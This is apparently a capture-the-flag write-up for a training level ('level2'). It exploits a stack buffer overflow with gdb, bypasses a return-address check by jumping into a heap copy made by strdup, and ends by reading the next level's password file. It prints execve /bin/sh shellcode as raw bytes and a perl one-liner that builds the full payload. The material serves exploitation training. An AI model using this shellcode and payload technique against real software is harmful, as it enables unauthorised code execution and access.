First we tried to use a shell-code and modify the return address to the beginning of the buffer (in the stack) :

  gdb> pattern_create 100
  quelquechosedelongetincomprehensible...
  gdb> r < <(echo 'cettememechoselonguetincomprehensible...')
  gdb> pattern_search
  Registers contain pattern buffer:
  EIP+0 found at offset: 80
  EBP+0 found at offset: 76
  ...
  ### USEFULL LATER
  Pattern buffer found at:
  0x0804a04b : offset   67 - size   33 ([heap])
  ###
  ...

But after a few hours of trying, We found out that the return pointer is (very lightly) checked :

  gdb> disas p
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
    0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]  |
    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax  |
    0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]  |
    0x080484fb <+39>:	and    eax,0xb0000000           | 
    0x08048500 <+44>:	cmp    eax,0xb0000000           # Compares on-the-stack $eip with 0xb-------
    0x08048505 <+49>:	jne    0x8048527 <p+83>
  
We tried many things (which we'll not detail here)
  - Return to libc (could work, can't make it work)
  - Use main's return address instead of p's return address

Finally we noticed that the buffer is moved on the head :

  gdb> pattern_search
  ...
  Pattern buffer found at:
    0x0804a04b : offset   67 - size   33 ([heap])
  ...
  gdb> disas p
    0x08048535 <+97>:	mov    DWORD PTR [esp],eax
    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>

The nice thing about that is that the address returned by strdup passes trough the filter :

  gdb> b *0x08048538
  gdb> set step-mode on
  gdb> r < dummy_payload
  gdb> n
  (peda auto register infos :)
  EAX: 0x804a008 ('D' <repeats 64 times>, "J\205\004\bDDDDDDDD")

Found a shellcode on wikipedia :

  00000000  EB1F              jmp short 0x21
  00000002  5E                pop esi
  00000003  897608            mov [esi+0x8],esi
  00000006  31C0              xor eax,eax
  00000008  884607            mov [esi+0x7],al
  0000000B  89460C            mov [esi+0xc],eax
  0000000E  B00B              mov al,0xb
  00000010  89F3              mov ebx,esi
  00000012  8D4E08            lea ecx,[esi+0x8]
  00000015  8D560C            lea edx,[esi+0xc]
  00000018  CD80              int 0x80
  0000001A  31DB              xor ebx,ebx
  0000001C  89D8              mov eax,ebx
  0000001E  40                inc eax
  0000001F  CD80              int 0x80
  00000021  E8DCFFFFFF        call 0x2
  00000026  2F                das
  00000027  62696E            bound ebp,[ecx+0x6e]
  0000002A  2F                das
  0000002B  7368              jnc 0x95

Compiled version :

  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

Payload :

  [shell-code: 45 bytes][dummy-letters: 35][return-address: 4 bytes]

  perl -e 'print
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
  . "D"x35
  . "\x08\xa0\x04\x08"
  ' > /tmp/payload

Running the code :

  > cat /tmp/payload - | ./level2
  [press enter]
  blablablabla

  cat /home/user/level3/.pass
  OUR_FLAG